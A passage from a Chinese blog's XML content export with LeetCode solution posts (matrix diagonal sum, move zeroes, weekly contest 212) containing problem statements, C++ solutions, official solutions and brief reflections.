        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵对角线元素的和</title>
    <url>/2020/11/10/%E7%9F%A9%E9%98%B5%E5%AF%B9%E8%A7%92%E7%BA%BF%E5%85%83%E7%B4%A0%E7%9A%84%E5%92%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/matrix-diagonal-sum/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个正方形矩阵 <code>mat</code>，请你返回矩阵对角线元素的和。</p>
<p>请你返回在矩阵主对角线上的元素和副对角线上且不在主对角线上元素的和。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/10/%E7%9F%A9%E9%98%B5%E5%AF%B9%E8%A7%92%E7%BA%BF%E5%85%83%E7%B4%A0%E7%9A%84%E5%92%8C/sample_1911.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：mat &#x3D; [[1,2,3],</span><br><span class="line">            [4,5,6],</span><br><span class="line">            [7,8,9]]</span><br><span class="line">输出：25</span><br><span class="line">解释：对角线的和为：1 + 5 + 9 + 3 + 7 &#x3D; 25</span><br><span class="line">请注意，元素 mat[1][1] &#x3D; 5 只会被计算一次。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：mat &#x3D; [[1,1,1,1],</span><br><span class="line">            [1,1,1,1],</span><br><span class="line">            [1,1,1,1],</span><br><span class="line">            [1,1,1,1]]</span><br><span class="line">输出：8</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：mat &#x3D; [[5]]</span><br><span class="line">输出：5</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>n == mat.length == mat[i].length</code></li>
<li><code>1 &lt;= n &lt;= 100</code></li>
<li><code>1 &lt;= mat[i][j] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目描述模拟，直接加上对角线上的元素值，注意矩阵的行数为奇数时会重复加上主副对角线的重叠值，需要减去。</p>
<p><strong>c++代码：</strong>(执行用时28ms，击败98.91%，内存消耗11.5M，击败5.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diagonalSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> n=mat.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            result+=mat[i][i];</span><br><span class="line">            result+=mat[i][n-i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//n是奇数，减去重复加上的中间的值</span></span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">            result-=mat[(n<span class="number">-1</span>)/<span class="number">2</span>][(n<span class="number">-1</span>)/<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/matrix-diagonal-sum/solution/ju-zhen-dui-jiao-xian-yuan-su-de-he-by-leetcode-so/">官方题解</a>:</h6><p><strong>方法一：遍历矩阵</strong><br><strong>思路与算法</strong></p>
<p>遍历整个矩阵，如果当前坐标 (i, j)(i,j) 满足 i = ji=j 或者 i + j = n - 1i+j=n−1，就把当前的数字加入到答案中。</p>
<p><strong>c++代码：</strong>（执行32ms，击败93.54%，内存11.5M，击败5.16%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diagonalSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = mat.size(), sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i == j || i + j == n - <span class="number">1</span>) &#123;</span><br><span class="line">                    sum += mat[i][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n^2)$，其中 $n$是矩阵 $\textit{mat}$的边长。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：逐行取数</strong><br><strong>思路与算法</strong></p>
<p>逐行遍历，记当前的行号为 $i$，对于一行我们把 $(i, i)$ 位置和  加入答案。这样如果 $n$ 是奇数的话，最中间的格子会被加入两次。所以 $n$ 为奇数的时候，我们需要减掉矩阵最中心的那个值。</p>
<p><strong>c++代码：</strong>（执行36ms，击败74.17%，内存11.5M，击败5.03%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">diagonalSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; mat)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = mat.size(), sum = <span class="number">0</span>, mid = n / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            sum += mat[i][i] + mat[i][n - <span class="number">1</span> - i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum - mat[mid][mid] * (n &amp; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：，其中 $n$是矩阵 $\textit{mat}$ 的边长。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>简单，没啥可说的，go on！🙄</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>移动零</title>
    <url>/2020/11/19/%E7%A7%BB%E5%8A%A8%E9%9B%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/move-zeroes/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个数组 <code>nums</code>，编写一个函数将所有 <code>0</code> 移动到数组的末尾，同时保持非零元素的相对顺序。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [0,1,0,3,12]</span><br><span class="line">输出: [1,3,12,0,0]</span><br></pre></td></tr></table></figure>
<p><strong>说明</strong>:</p>
<ol>
<li>必须在原数组上操作，不能拷贝额外的数组。</li>
<li>尽量减少操作次数。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组，删除元素0然后在末尾添加一个元素0,注意删除元素后数组元素的索引。</p>
<p><strong>c++代码：</strong>(执行用时24ms，击败10.55%，内存消耗9.1M，击败22.73%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=nums.size();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]==<span class="number">0</span>)&#123;</span><br><span class="line">                nums.erase(nums.begin()+i);</span><br><span class="line">                nums.emplace_back(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">//前面删除一个0</span></span><br><span class="line">                --i;</span><br><span class="line">                --n;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/move-zeroes/solution/yi-dong-ling-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：双指针</strong></p>
<p><strong>思路及解法</strong></p>
<p>使用双指针，左指针指向当前已经处理好的序列的尾部，右指针指向待处理序列的头部。</p>
<p>右指针不断向右移动，每次右指针指向非零数，则将左右指针对应的数交换，同时左指针右移。</p>
<p>注意到以下性质：</p>
<p>左指针左边均为非零数；</p>
<p>右指针左边直到左指针处均为零。</p>
<p>因此每次交换，都是将左指针的零与右指针的非零数交换，且非零数的相对顺序并未改变。</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败49.15%，内存消耗9.2M，击败10.44%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size(), left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[right]) &#123;</span><br><span class="line">                swap(nums[left], nums[right]);</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为序列长度。每个位置至多被遍历两次。</li>
<li>空间复杂度：$O(1)$。只需要常数的空间存放若干变量。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>自己的方法效率还是不行，vector容器删除和插入元素比较慢（需要前后元素前移或后移），优势是查找元素比较快（下表索引），所以自己使用的erase()函数和emplace_back()函数效率都不太高。而官方题解使用的是双指针还挺巧妙的，将左指针指向的零与右指针指向的非零数交换。双指针方法还挺常用的，以后多多使用吧。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>第212场周赛</title>
    <url>/2020/10/25/%E7%AC%AC212%E5%9C%BA%E5%91%A8%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><a href="https://leetcode-cn.com/contest/weekly-contest-212/">比赛地址</a></p>
<h6 id="比赛说明"><a href="#比赛说明" class="headerlink" title="比赛说明"></a>比赛说明</h6><p>本场竞赛由「猿辅导」&amp;「力扣」联合主办</p>
<p><strong>【工作机会奖励】</strong></p>
<ul>
<li>排名第 1 ~ 1000 名参赛者可获「猿辅导」社招简历内推机会。</li>
</ul>
<p><strong>【实物周边奖励】</strong></p>
<ul>
<li>排名第 1 ~ 10 名的参赛者可获「2020 猿辅导鼠年纪念币」；</li>
<li>排名第 11 ~ 30 名的参赛者可获「小猿手办」；</li>
<li>排名第 99、199、299 名的参赛者可获「幸运奖」；</li>
</ul>
<a id="more"></a>
<p><strong>重要提示</strong></p>
<ol>
<li><p>请注意，每个错误提交的惩罚时间已经从 <strong>10分钟</strong> 改变为了 <strong>5分钟</strong> 。</p>
</li>
<li><p>力扣一向非常重视竞赛的公平，为了保障每一位用户的权益，如有用户被检查出竞赛中存在违规行为（如抄袭、作弊等），我们会坚持以 <strong>零容忍</strong> 的态度维护竞赛的公平、公正。</p>
</li>
<li><p>以下被判定为竞赛中的违规行为</p>
<ul>
<li><p>一人使用多账号提交（英文站 LCUS 的账号 和 中文站 LCCN 的账号属于两个账号）</p>
</li>
<li><p>通过不正当的方式将部分或全部测试用例的答案直接贴到代码里的</p>
</li>
<li>多账号提交雷同代码（抄袭）</li>
<li>使用不正当手段影响他人竞赛的</li>
<li>竞赛结束前在讨论区发布答案的</li>
</ul>
</li>
<li><p>如被发现违规行为，我们将会严格按照以下处罚规则执行：</p>
<ul>
<li><p><strong>第一次违规</strong>：账号内的所有积分清零，账号冻结 1 个月</p>
</li>
<li><p><strong>第二次违规</strong>：永久封号</p>
</li>
</ul>
</li>
<li><p>同时我们也鼓励大家共同维护竞赛的公平和公正，我们会给与举报成功的用户额外的奖励：</p>
<ul>
<li><p>被认定为违规账号的前 10 名举报者，每人可获得 20 积分奖励</p>
</li>
<li><p>每人每场最高可获得举报成功的 100 积分奖励</p>
</li>
</ul>
</li>
</ol>
<h6 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h6><div class="table-container">
<table>
<thead>
<tr>
<th>题目</th>
<th>难度</th>
<th>得分</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.<a href="https://leetcode-cn.com/problems/slowest-key/">按键持续时间最长的键</a></td>
<td>简单</td>
<td>3</td>
</tr>
<tr>
<td>2.<a href="https://leetcode-cn.com/problems/arithmetic-subarrays/">等差子数组</a></td>
<td>中等</td>
<td>4</td>
</tr>
<tr>
<td>3.<a href="https://leetcode-cn.com/problems/path-with-minimum-effort/">最小体力消耗路径</a></td>
<td>中等</td>
<td>5</td>
</tr>
<tr>
<td>4.<a href="https://leetcode-cn.com/problems/rank-transform-of-a-matrix/">矩阵转换后的秩</a></td>
<td>困难</td>
<td>7</td>
</tr>
</tbody>
</table>
</div>
<h6 id="按键持续时间最长的键"><a href="#按键持续时间最长的键" class="headerlink" title="按键持续时间最长的键"></a>按键持续时间最长的键</h6><p><strong>题目描述：</strong></p>
<p>LeetCode 设计了一款新式键盘，正在测试其可用性。测试人员将会点击一系列键（总计 n 个），每次一个。</p>
<p>给你一个长度为 n 的字符串 <code>keysPressed</code> ，其中 <code>keysPressed[i]</code> 表示测试序列中第 i 个被按下的键。<code>releaseTimes</code> 是一个升序排列的列表，其中 <code>releaseTimes[i]</code> 表示松开第 i 个键的时间。字符串和数组的 <strong>下标都从 0 开始</strong> 。第 <code>0</code> 个键在时间为 <code>0</code> 时被按下，接下来每个键都 <strong>恰好</strong> 在前一个键松开时被按下。</p>
<p>测试人员想要找出按键 <strong>持续时间最长</strong> 的键。第 <code>i</code> 次按键的持续时间为 <code>releaseTimes[i] - releaseTimes[i - 1]</code> ，第 <code>0</code> 次按键的持续时间为 <code>releaseTimes[0]</code> 。</p>
<p>注意，测试期间，同一个键可以在不同时刻被多次按下，而每次的持续时间都可能不同。</p>
<p>请返回按键 <strong>持续时间最长</strong> 的键，如果有多个这样的键，则返回 <strong>按字母顺序排列最大</strong> 的那个键。</p>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：releaseTimes &#x3D; [9,29,49,50], keysPressed &#x3D; &quot;cbcd&quot;</span><br><span class="line">输出：&quot;c&quot;</span><br><span class="line">解释：按键顺序和持续时间如下：</span><br><span class="line">按下 &#39;c&#39; ，持续时间 9（时间 0 按下，时间 9 松开）</span><br><span class="line">按下 &#39;b&#39; ，持续时间 29 - 9 &#x3D; 20（松开上一个键的时间 9 按下，时间 29 松开）</span><br><span class="line">按下 &#39;c&#39; ，持续时间 49 - 29 &#x3D; 20（松开上一个键的时间 29 按下，时间 49 松开）</span><br><span class="line">按下 &#39;d&#39; ，持续时间 50 - 49 &#x3D; 1（松开上一个键的时间 49 按下，时间 50 松开）</span><br><span class="line">按键持续时间最长的键是 &#39;b&#39; 和 &#39;c&#39;（第二次按下时），持续时间都是 20</span><br><span class="line">&#39;c&#39; 按字母顺序排列比 &#39;b&#39; 大，所以答案是 &#39;c&#39;</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：releaseTimes &#x3D; [12,23,36,46,62], keysPressed &#x3D; &quot;spuda&quot;</span><br><span class="line">输出：&quot;a&quot;</span><br><span class="line">解释：按键顺序和持续时间如下：</span><br><span class="line">按下 &#39;s&#39; ，持续时间 12</span><br><span class="line">按下 &#39;p&#39; ，持续时间 23 - 12 &#x3D; 11</span><br><span class="line">按下 &#39;u&#39; ，持续时间 36 - 23 &#x3D; 13</span><br><span class="line">按下 &#39;d&#39; ，持续时间 46 - 36 &#x3D; 10</span><br><span class="line">按下 &#39;a&#39; ，持续时间 62 - 46 &#x3D; 16</span><br><span class="line">按键持续时间最长的键是 &#39;a&#39; ，持续时间 16</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>releaseTimes.length == n</code></li>
<li><code>keysPressed.length == n</code></li>
<li><code>2 &lt;= n &lt;= 1000</code></li>
<li><code>0 &lt;= releaseTimes[i] &lt;= 109</code></li>
<li><code>releaseTimes[i] &lt; releaseTimes[i+1]</code></li>
<li><code>keysPressed 仅由小写英文字母组成</code></li>
</ul>
<p><strong>思路：</strong></p>
<p>用一个变量存储最长的持续时间，然后依次遍历releaseTimes计算每个键的持续时间（第1个键特殊处理），比较持续时间若相同比较字母顺序。</p>
<p><strong>提交的代码：</strong>（运行时间16ms，内存消耗10.7M）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">char</span> <span class="title">slowestKey</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; releaseTimes, <span class="built_in">string</span> keysPressed)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//先把releaseTimes转换成每个键的持续时间，从后面开始</span></span><br><span class="line">        <span class="keyword">int</span> key_time=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span> c;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=releaseTimes.size()<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="comment">//计算持续时间，第一个键例外</span></span><br><span class="line">            <span class="keyword">if</span>(i!=<span class="number">0</span>)&#123;</span><br><span class="line">                releaseTimes[i]=releaseTimes[i]-releaseTimes[i<span class="number">-1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(releaseTimes[i]&gt;key_time)&#123;</span><br><span class="line">                <span class="comment">//持续时间最长的键</span></span><br><span class="line">                key_time=releaseTimes[i];</span><br><span class="line">                c=keysPressed[i];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(releaseTimes[i]==key_time)&#123;</span><br><span class="line">                <span class="comment">//相同持续时间比较字母顺序</span></span><br><span class="line">                <span class="keyword">if</span>(keysPressed[i]&gt;c)&#123;</span><br><span class="line">                    c=keysPressed[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="等差子数组"><a href="#等差子数组" class="headerlink" title="等差子数组"></a>等差子数组</h6><p><strong>题目描述：</strong></p>
<p>如果一个数列由至少两个元素组成，且每两个连续元素之间的差值都相同，那么这个序列就是 等差数列 。更正式地，数列 <code>s</code> 是等差数列，只需要满足：对于每个有效的 <code>i</code> ， s[i+1] - s[i] == s[1] - s[0] 都成立。</p>
<p>例如，下面这些都是 <strong>等差数列</strong> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1, 3, 5, 7, 9</span><br><span class="line">7, 7, 7, 7</span><br><span class="line">3, -1, -5, -9</span><br></pre></td></tr></table></figure>
<p>下面的数列 <strong>不是等差数列</strong> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1, 1, 2, 5, 7</span><br></pre></td></tr></table></figure>
<p>给你一个由 <code>n</code> 个整数组成的数组 <code>nums</code>，和两个由 <code>m</code> 个整数组成的数组 <code>l</code> 和 <code>r</code>，后两个数组表示 <code>m</code> 组范围查询，其中第 <code>i</code> 个查询对应范围 <code>[l[i], r[i]]</code> 。所有数组的下标都是 <strong>从 0 开始</strong> 的。</p>
<p>返回 <code>boolean</code> 元素构成的答案列表 <code>answer</code> 。如果子数组 <code>nums[l[i]], nums[l[i]+1], ... , nums[r[i]]</code> 可以 <strong>重新排列</strong> 形成 <strong>等差数列</strong> ，<code>answer[i]</code> 的值就是 <code>true</code>；否则<code>answer[i]</code> 的值就是 <code>false</code> 。</p>
<p> <strong>示例1：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：nums = [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">7</span>], l = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>], r = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>]</span><br><span class="line">输出：[<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">true</span>]</span><br><span class="line">解释：</span><br><span class="line">第 <span class="number">0</span> 个查询，对应子数组 [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>] 。可以重新排列为等差数列 [<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>] 。</span><br><span class="line">第 <span class="number">1</span> 个查询，对应子数组 [<span class="number">4</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">9</span>] 。无法重新排列形成等差数列。</span><br><span class="line">第 <span class="number">2</span> 个查询，对应子数组 [<span class="number">5</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">7</span>] 。可以重新排列为等差数列 [<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">9</span>] 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">输入：nums = [<span class="number">-12</span>,<span class="number">-9</span>,<span class="number">-3</span>,<span class="number">-12</span>,<span class="number">-6</span>,<span class="number">15</span>,<span class="number">20</span>,<span class="number">-25</span>,<span class="number">-20</span>,<span class="number">-15</span>,<span class="number">-10</span>], l = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">7</span>], r = [<span class="number">4</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>]</span><br><span class="line">输出：[<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">false</span>,<span class="literal">false</span>,<span class="literal">true</span>,<span class="literal">true</span>]</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>n == nums.length</code></li>
<li><code>m == l.length</code></li>
<li><code>m == r.length</code></li>
<li><code>2 &lt;= n &lt;= 500</code></li>
<li><code>1 &lt;= m &lt;= 500</code></li>
<li><code>0 &lt;= l[i] &lt; r[i] &lt; n</code></li>
<li><code>-105 &lt;= nums[i] &lt;= 105</code></li>
</ul>
<p><strong>思路：</strong></p>
<p>用vector容器存储返回结果，默认值为true。m次循环（m是数组l的长度），在每次循环中得到相对应的范围数组，然后判断数组是否是等差数列，如果不是则修改结果容器对应元素为false</p>
<p><strong>代码：</strong>（执行用时204ms，击败47.38%，内存20.9M，击败83.18%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; <span class="title">checkArithmeticSubarrays</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; l, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; r)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//定义布尔类型返回向量容器，默认值是true</span></span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; <span class="title">result</span><span class="params">(l.size(),<span class="literal">true</span>)</span></span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; tmp;</span><br><span class="line">        <span class="keyword">int</span> d=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//得到结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;l.size();i++)&#123;</span><br><span class="line">            <span class="comment">//数组元素清空</span></span><br><span class="line">            tmp.clear();</span><br><span class="line">            <span class="keyword">for</span>(j=l[i];j&lt;=r[i];j++)&#123;</span><br><span class="line">                <span class="comment">//存储获取到的范围数组</span></span><br><span class="line">                tmp.push_back(nums[j]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//重新排序</span></span><br><span class="line">            sort(tmp.begin(),tmp.end());</span><br><span class="line">            <span class="comment">//判断子数组是否是等差数组</span></span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;tmp.size()<span class="number">-1</span>;j++)&#123;</span><br><span class="line">                    <span class="comment">//求公差</span></span><br><span class="line">                    <span class="keyword">if</span>(j==<span class="number">0</span>)&#123;</span><br><span class="line">                        